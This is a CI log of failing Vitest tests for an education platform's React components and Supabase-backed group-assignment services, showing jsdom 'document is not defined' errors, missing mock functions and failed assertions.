2025-11-18T17:36:11.4056469Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4057441Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4058239Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m315:7[22m[39m
2025-11-18T17:36:11.4058411Z     [90m313| [39m
2025-11-18T17:36:11.4058748Z     [90m314| [39m    it('shows completed state', () => {
2025-11-18T17:36:11.4058981Z     [90m315| [39m      render(
2025-11-18T17:36:11.4059213Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4059492Z     [90m316| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4059816Z     [90m317| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.4059827Z 
2025-11-18T17:36:11.4060181Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[345/545]⎯[22m[39m
2025-11-18T17:36:11.4060367Z 
2025-11-18T17:36:11.4062045Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mInteraction[2m > [22mtracks time spent via progress updates
2025-11-18T17:36:11.4062467Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4063190Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4063958Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m332:9[22m[39m
2025-11-18T17:36:11.4064146Z     [90m330| [39m
2025-11-18T17:36:11.4064369Z     [90m331| [39m      act(() => {
2025-11-18T17:36:11.4064594Z     [90m332| [39m        render(
2025-11-18T17:36:11.4064837Z     [90m   | [39m        [31m^[39m
2025-11-18T17:36:11.4065131Z     [90m333| [39m          <StudentBlockRenderer
2025-11-18T17:36:11.4065473Z     [90m334| [39m            block={bibliographyBlock}
2025-11-18T17:36:11.4066132Z [90m [2m❯[22m node_modules/@testing-library/react/dist/act-compat.js:[2m48:24[22m[39m
2025-11-18T17:36:11.4066748Z [90m [2m❯[22m act node_modules/react/cjs/react.development.js:[2m2512:16[22m[39m
2025-11-18T17:36:11.4067724Z [90m [2m❯[22m Proxy.<anonymous> node_modules/@testing-library/react/dist/act-compat.js:[2m47:25[22m[39m
2025-11-18T17:36:11.4068510Z [90m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m331:7[22m[39m
2025-11-18T17:36:11.4068522Z 
2025-11-18T17:36:11.4068883Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[346/545]⎯[22m[39m
2025-11-18T17:36:11.4068908Z 
2025-11-18T17:36:11.4070535Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mAccessibility[2m > [22mhas proper heading hierarchy
2025-11-18T17:36:11.4070960Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4071695Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4072487Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m355:7[22m[39m
2025-11-18T17:36:11.4072813Z     [90m353| [39m  describe('Accessibility', () => {
2025-11-18T17:36:11.4073198Z     [90m354| [39m    it('has proper heading hierarchy', () => {
2025-11-18T17:36:11.4073418Z     [90m355| [39m      render(
2025-11-18T17:36:11.4073654Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4073942Z     [90m356| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4074449Z     [90m357| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.4074462Z 
2025-11-18T17:36:11.4074800Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[347/545]⎯[22m[39m
2025-11-18T17:36:11.4074812Z 
2025-11-18T17:36:11.4076556Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mAccessibility[2m > [22mprovides descriptive link text
2025-11-18T17:36:11.4077217Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4077958Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4078745Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m372:7[22m[39m
2025-11-18T17:36:11.4078923Z     [90m370| [39m
2025-11-18T17:36:11.4079322Z     [90m371| [39m    it('provides descriptive link text', () => {
2025-11-18T17:36:11.4079545Z     [90m372| [39m      render(
2025-11-18T17:36:11.4079784Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4080077Z     [90m373| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4080402Z     [90m374| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.4080414Z 
2025-11-18T17:36:11.4080777Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[348/545]⎯[22m[39m
2025-11-18T17:36:11.4080788Z 
2025-11-18T17:36:11.4082454Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mEdge Cases[2m > [22mhandles items without optional fields
2025-11-18T17:36:11.4082882Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4083606Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4084387Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m414:7[22m[39m
2025-11-18T17:36:11.4084575Z     [90m412| [39m      };
2025-11-18T17:36:11.4084756Z     [90m413| [39m
2025-11-18T17:36:11.4084976Z     [90m414| [39m      render(
2025-11-18T17:36:11.4085210Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4085497Z     [90m415| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4085848Z     [90m416| [39m          block={blockWithMinimalItems}
2025-11-18T17:36:11.4085859Z 
2025-11-18T17:36:11.4086360Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[349/545]⎯[22m[39m
2025-11-18T17:36:11.4086372Z 
2025-11-18T17:36:11.4088362Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mEdge Cases[2m > [22mhandles items with "Sin categoría" when categories are shown
2025-11-18T17:36:11.4088811Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4089541Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4090329Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m444:7[22m[39m
2025-11-18T17:36:11.4090716Z     [90m442| [39m      };
2025-11-18T17:36:11.4090883Z     [90m443| [39m
2025-11-18T17:36:11.4091112Z     [90m444| [39m      render(
2025-11-18T17:36:11.4091344Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4091639Z     [90m445| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4092015Z     [90m446| [39m          block={blockWithUncategorized}
2025-11-18T17:36:11.4092027Z 
2025-11-18T17:36:11.4092386Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[350/545]⎯[22m[39m
2025-11-18T17:36:11.4092397Z 
2025-11-18T17:36:11.4094048Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mEdge Cases[2m > [22mhandles missing title gracefully
2025-11-18T17:36:11.4094463Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4095190Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4095969Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m465:7[22m[39m
2025-11-18T17:36:11.4096159Z     [90m463| [39m      };
2025-11-18T17:36:11.4096321Z     [90m464| [39m
2025-11-18T17:36:11.4096542Z     [90m465| [39m      render(
2025-11-18T17:36:11.4096908Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4097365Z     [90m466| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4097695Z     [90m467| [39m          block={blockWithoutTitle}
2025-11-18T17:36:11.4097708Z 
2025-11-18T17:36:11.4098065Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[351/545]⎯[22m[39m
2025-11-18T17:36:11.4098082Z 
2025-11-18T17:36:11.4099820Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22mgroupAssignmentsV2Service[2m > [22mgetGroupAssignmentsForUser[2m > [22mextracts group assignments with resources from lessons
2025-11-18T17:36:11.4100421Z [31m[1mAssertionError[22m: expected [] to have a length of 2 but got +0[39m
2025-11-18T17:36:11.4100454Z 
2025-11-18T17:36:11.4100579Z - Expected
2025-11-18T17:36:11.4100699Z + Received
2025-11-18T17:36:11.4100709Z 
2025-11-18T17:36:11.4100829Z - 2
2025-11-18T17:36:11.4100944Z + 0
2025-11-18T17:36:11.4100955Z 
2025-11-18T17:36:11.4101612Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2.test.js:[2m169:27[22m[39m
2025-11-18T17:36:11.4102206Z     [90m167| [39m      const { assignments } = await groupAssignmentsV2Service.getGroup…
2025-11-18T17:36:11.4102391Z     [90m168| [39m
2025-11-18T17:36:11.4102764Z     [90m169| [39m      expect(assignments).toHaveLength(2);
2025-11-18T17:36:11.4103082Z     [90m   | [39m                          [31m^[39m
2025-11-18T17:36:11.4103267Z     [90m170| [39m      
2025-11-18T17:36:11.4103654Z     [90m171| [39m      // Check first assignment (with resources)
2025-11-18T17:36:11.4103673Z 
2025-11-18T17:36:11.4104035Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[352/545]⎯[22m[39m
2025-11-18T17:36:11.4104060Z 
2025-11-18T17:36:11.4105740Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22mgroupAssignmentsV2Service[2m > [22mgetGroupAssignmentsForUser[2m > [22mhandles malformed block payloads gracefully
2025-11-18T17:36:11.4106345Z [31m[1mAssertionError[22m: expected [] to have a length of 3 but got +0[39m
2025-11-18T17:36:11.4106359Z 
2025-11-18T17:36:11.4106480Z - Expected
2025-11-18T17:36:11.4106615Z + Received
2025-11-18T17:36:11.4106627Z 
2025-11-18T17:36:11.4106740Z - 3
2025-11-18T17:36:11.4107021Z + 0
2025-11-18T17:36:11.4107035Z 
2025-11-18T17:36:11.4107687Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2.test.js:[2m394:27[22m[39m
2025-11-18T17:36:11.4108269Z     [90m392| [39m      const { assignments } = await groupAssignmentsV2Service.getGroup…
2025-11-18T17:36:11.4108453Z     [90m393| [39m      
2025-11-18T17:36:11.4108820Z     [90m394| [39m      expect(assignments).toHaveLength(3);
2025-11-18T17:36:11.4109115Z     [90m   | [39m                          [31m^[39m
2025-11-18T17:36:11.4109491Z     [90m395| [39m      
2025-11-18T17:36:11.4109803Z     [90m396| [39m      // Should use default values
2025-11-18T17:36:11.4109815Z 
2025-11-18T17:36:11.4110165Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[353/545]⎯[22m[39m
2025-11-18T17:36:11.4110176Z 
2025-11-18T17:36:11.4111573Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22mgroupAssignmentsV2Service[2m > [22mgetOrCreateGroup[2m > [22mreturns existing group if found
2025-11-18T17:36:11.4112018Z [31m[1mAssertionError[22m: expected null to deeply equal { id: 'group-123', …(2) }[39m
2025-11-18T17:36:11.4112027Z 
2025-11-18T17:36:11.4112110Z - Expected: 
2025-11-18T17:36:11.4112181Z Object {
2025-11-18T17:36:11.4112310Z   "assignment_id": "assignment-123",
2025-11-18T17:36:11.4112437Z   "id": "group-123",
2025-11-18T17:36:11.4112529Z   "name": "Existing Group",
2025-11-18T17:36:11.4112598Z }
2025-11-18T17:36:11.4112605Z 
2025-11-18T17:36:11.4112681Z + Received: 
2025-11-18T17:36:11.4112750Z null
2025-11-18T17:36:11.4112757Z 
2025-11-18T17:36:11.4113134Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2.test.js:[2m449:21[22m[39m
2025-11-18T17:36:11.4113461Z     [90m447| [39m      const { group } = await groupAssignmentsV2Service.getOrCreateGro…
2025-11-18T17:36:11.4113566Z     [90m448| [39m      
2025-11-18T17:36:11.4113945Z     [90m449| [39m      expect(group).toEqual(existingGroup);
2025-11-18T17:36:11.4114114Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4114223Z     [90m450| [39m    });
2025-11-18T17:36:11.4114319Z     [90m451| [39m
2025-11-18T17:36:11.4114325Z 
2025-11-18T17:36:11.4114537Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[354/545]⎯[22m[39m
2025-11-18T17:36:11.4114544Z 
2025-11-18T17:36:11.4115383Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22mgroupAssignmentsV2Service[2m > [22mgetOrCreateGroup[2m > [22mcreates new group when none exists
2025-11-18T17:36:11.4115802Z [31m[1mAssertionError[22m: expected null to deeply equal { id: 'new-group-123', …(2) }[39m
2025-11-18T17:36:11.4115809Z 
2025-11-18T17:36:11.4115886Z - Expected: 
2025-11-18T17:36:11.4115956Z Object {
2025-11-18T17:36:11.4116082Z   "assignment_id": "assignment-123",
2025-11-18T17:36:11.4116165Z   "id": "new-group-123",
2025-11-18T17:36:11.4116254Z   "name": "Grupo 1234567890",
2025-11-18T17:36:11.4116320Z }
2025-11-18T17:36:11.4116334Z 
2025-11-18T17:36:11.4116408Z + Received: 
2025-11-18T17:36:11.4116474Z null
2025-11-18T17:36:11.4116480Z 
2025-11-18T17:36:11.4117138Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2.test.js:[2m501:21[22m[39m
2025-11-18T17:36:11.4120844Z     [90m499| [39m      const { group } = await groupAssignmentsV2Service.getOrCreateGro…
2025-11-18T17:36:11.4121108Z     [90m500| [39m      
2025-11-18T17:36:11.4121487Z     [90m501| [39m      expect(group).toEqual(newGroup);
2025-11-18T17:36:11.4121768Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4122257Z     [90m502| [39m      expect(mockGroupsInsert.insert).toHaveBeenCalledWith({
2025-11-18T17:36:11.4122579Z     [90m503| [39m        assignment_id: 'assignment-123',
2025-11-18T17:36:11.4122592Z 
2025-11-18T17:36:11.4122934Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[355/545]⎯[22m[39m
2025-11-18T17:36:11.4122945Z 
2025-11-18T17:36:11.4124646Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mRole-based access control[2m > [22mshould return empty array for non-admin/consultant users
2025-11-18T17:36:11.4125265Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.4125892Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2Admin.test.js:[2m32:21[22m[39m
2025-11-18T17:36:11.4126064Z     [90m 30| [39m        })
2025-11-18T17:36:11.4126231Z     [90m 31| [39m      });
2025-11-18T17:36:11.4126632Z     [90m 32| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.4127338Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4127501Z     [90m 33| [39m
2025-11-18T17:36:11.4128056Z     [90m 34| [39m      const result = await groupAssignmentsV2Service.getAllAssignments…
2025-11-18T17:36:11.4128069Z 
2025-11-18T17:36:11.4128418Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[356/545]⎯[22m[39m
2025-11-18T17:36:11.4128429Z 
2025-11-18T17:36:11.4130052Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mRole-based access control[2m > [22mshould allow access for admin users
2025-11-18T17:36:11.4130649Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.4131324Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2Admin.test.js:[2m93:21[22m[39m
2025-11-18T17:36:11.4131496Z     [90m 91| [39m      });
2025-11-18T17:36:11.4131658Z     [90m 92| [39m
2025-11-18T17:36:11.4132031Z     [90m 93| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.4132298Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4132473Z     [90m 94| [39m
2025-11-18T17:36:11.4133048Z     [90m 95| [39m      const result = await groupAssignmentsV2Service.getAllAssignments…
2025-11-18T17:36:11.4133072Z 
2025-11-18T17:36:11.4133435Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[357/545]⎯[22m[39m
2025-11-18T17:36:11.4133637Z 
2025-11-18T17:36:11.4135496Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mRole-based access control[2m > [22mshould filter courses for consultant users based on assignments
2025-11-18T17:36:11.4136146Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.4137138Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2Admin.test.js:[2m188:21[22m[39m
2025-11-18T17:36:11.4137352Z     [90m186| [39m      });
2025-11-18T17:36:11.4137533Z     [90m187| [39m
2025-11-18T17:36:11.4137959Z     [90m188| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.4138233Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4138402Z     [90m189| [39m
2025-11-18T17:36:11.4138983Z     [90m190| [39m      const result = await groupAssignmentsV2Service.getAllAssignments…
2025-11-18T17:36:11.4138995Z 
2025-11-18T17:36:11.4139363Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[358/545]⎯[22m[39m
2025-11-18T17:36:11.4139375Z 
2025-11-18T17:36:11.4140949Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mFiltering functionality[2m > [22mshould filter by school_id
2025-11-18T17:36:11.4141567Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.4142261Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2Admin.test.js:[2m287:21[22m[39m
2025-11-18T17:36:11.4142458Z     [90m285| [39m      });
2025-11-18T17:36:11.4142622Z     [90m286| [39m
2025-11-18T17:36:11.4143037Z     [90m287| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.4143313Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4143475Z     [90m288| [39m
2025-11-18T17:36:11.4143864Z     [90m289| [39m      const filters = { school_id: 'school-1' };
2025-11-18T17:36:11.4143875Z 
2025-11-18T17:36:11.4144235Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[359/545]⎯[22m[39m
2025-11-18T17:36:11.4144246Z 
2025-11-18T17:36:11.4145840Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mFiltering functionality[2m > [22mshould filter by community_id
2025-11-18T17:36:11.4146461Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.4150280Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2Admin.test.js:[2m357:21[22m[39m
2025-11-18T17:36:11.4150664Z     [90m355| [39m      });
2025-11-18T17:36:11.4150835Z     [90m356| [39m
2025-11-18T17:36:11.4151235Z     [90m357| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.4151488Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4151646Z     [90m358| [39m
2025-11-18T17:36:11.4151990Z     [90m359| [39m      const filters = { community_id: 'comm-1' };
2025-11-18T17:36:11.4152001Z 
2025-11-18T17:36:11.4152338Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[360/545]⎯[22m[39m
2025-11-18T17:36:11.4152349Z 
2025-11-18T17:36:11.4153725Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mPagination[2m > [22mshould paginate results correctly
2025-11-18T17:36:11.4154300Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.4154959Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2Admin.test.js:[2m439:21[22m[39m
2025-11-18T17:36:11.4155143Z     [90m437| [39m      }
2025-11-18T17:36:11.4155303Z     [90m438| [39m
2025-11-18T17:36:11.4155704Z     [90m439| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.4155967Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4156123Z     [90m440| [39m
2025-11-18T17:36:11.4156376Z     [90m441| [39m      // Test first page
2025-11-18T17:36:11.4156386Z 
2025-11-18T17:36:11.4157020Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[361/545]⎯[22m[39m
2025-11-18T17:36:11.4157037Z 
2025-11-18T17:36:11.4158629Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mPagination[2m > [22mshould return empty array when offset exceeds total
2025-11-18T17:36:11.4159242Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.4159919Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2Admin.test.js:[2m498:21[22m[39m
2025-11-18T17:36:11.4160106Z     [90m496| [39m      });
2025-11-18T17:36:11.4160272Z     [90m497| [39m
2025-11-18T17:36:11.4160684Z     [90m498| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.4160952Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4161110Z     [90m499| [39m
2025-11-18T17:36:11.4161676Z     [90m500| [39m      const result = await groupAssignmentsV2Service.getAllAssignments…
2025-11-18T17:36:11.4161696Z 
2025-11-18T17:36:11.4162029Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[362/545]⎯[22m[39m
2025-11-18T17:36:11.4162040Z 
2025-11-18T17:36:11.4163535Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mError handling[2m > [22mshould handle profile fetch errors
2025-11-18T17:36:11.4164157Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.4164854Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2Admin.test.js:[2m520:21[22m[39m
2025-11-18T17:36:11.4165051Z     [90m518| [39m      });
2025-11-18T17:36:11.4165226Z     [90m519| [39m      
2025-11-18T17:36:11.4165646Z     [90m520| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.4165917Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4166089Z     [90m521| [39m
2025-11-18T17:36:11.4166680Z     [90m522| [39m      const result = await groupAssignmentsV2Service.getAllAssignments…
2025-11-18T17:36:11.4166692Z 
2025-11-18T17:36:11.4167197Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[363/545]⎯[22m[39m
2025-11-18T17:36:11.4167209Z 
2025-11-18T17:36:11.4168841Z [31m[1m[7m FAIL [27m[22m[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mError handling[2m > [22mshould handle course fetch errors gracefully
2025-11-18T17:36:11.4169461Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.4170154Z [36m [2m❯[22m __tests__/lib/services/groupAssignmentsV2Admin.test.js:[2m554:21[22m[39m
2025-11-18T17:36:11.4170506Z     [90m552| [39m      });
2025-11-18T17:36:11.4170670Z     [90m553| [39m
2025-11-18T17:36:11.4171081Z     [90m554| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.4171361Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.4171525Z     [90m555| [39m
2025-11-18T17:36:11.4172122Z     [90m556| [39m      const result = await groupAssignmentsV2Service.getAllAssignments…
2025-11-18T17:36:11.4172133Z 
2025-11-18T17:36:11.4172485Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[364/545]⎯[22m[39m
2025-11-18T17:36:11.4172495Z 
2025-11-18T17:36:11.4173687Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/feedback.test.tsx[2m > [22mFeedbackDashboard[2m > [22mrenders feedback data and stats after loading
2025-11-18T17:36:11.4174139Z [31m[1mTypeError[22m: renderWithAct is not a function[39m
2025-11-18T17:36:11.4174684Z [36m [2m❯[22m __tests__/pages/admin/feedback.test.tsx:[2m155:11[22m[39m
2025-11-18T17:36:11.4174861Z     [90m153| [39m
2025-11-18T17:36:11.4175382Z     [90m154| [39m  it('renders feedback data and stats after loading', async () => {
2025-11-18T17:36:11.4175775Z     [90m155| [39m    await renderWithAct(<FeedbackDashboard />);
2025-11-18T17:36:11.4176023Z     [90m   | [39m          [31m^[39m
2025-11-18T17:36:11.4176187Z     [90m156| [39m
2025-11-18T17:36:11.4177011Z     [90m157| [39m    // Wait for loading to finish and check for final content
2025-11-18T17:36:11.4177029Z 
2025-11-18T17:36:11.4177421Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[365/545]⎯[22m[39m
2025-11-18T17:36:11.4177432Z 
2025-11-18T17:36:11.4179141Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould show password reset button only for approved users
2025-11-18T17:36:11.4179578Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4180251Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4181025Z [36m [2m❯[22m __tests__/pages/admin/user-management-password-reset.test.tsx:[2m136:5[22m[39m
2025-11-18T17:36:11.4181186Z     [90m134| [39m
2025-11-18T17:36:11.4181736Z     [90m135| [39m  it('should show password reset button only for approved users', asyn…
2025-11-18T17:36:11.4182026Z     [90m136| [39m    render(<UserManagement />);
2025-11-18T17:36:11.4182263Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.4182518Z     [90m137| [39m    await waitFor(() => {
2025-11-18T17:36:11.4183005Z     [90m138| [39m      expect(screen.getByText('John Doe')).toBeInTheDocument();
2025-11-18T17:36:11.4183016Z 
2025-11-18T17:36:11.4183372Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[366/545]⎯[22m[39m
2025-11-18T17:36:11.4183383Z 
2025-11-18T17:36:11.4184995Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould open password reset modal when reset button is clicked
2025-11-18T17:36:11.4185988Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.4187315Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
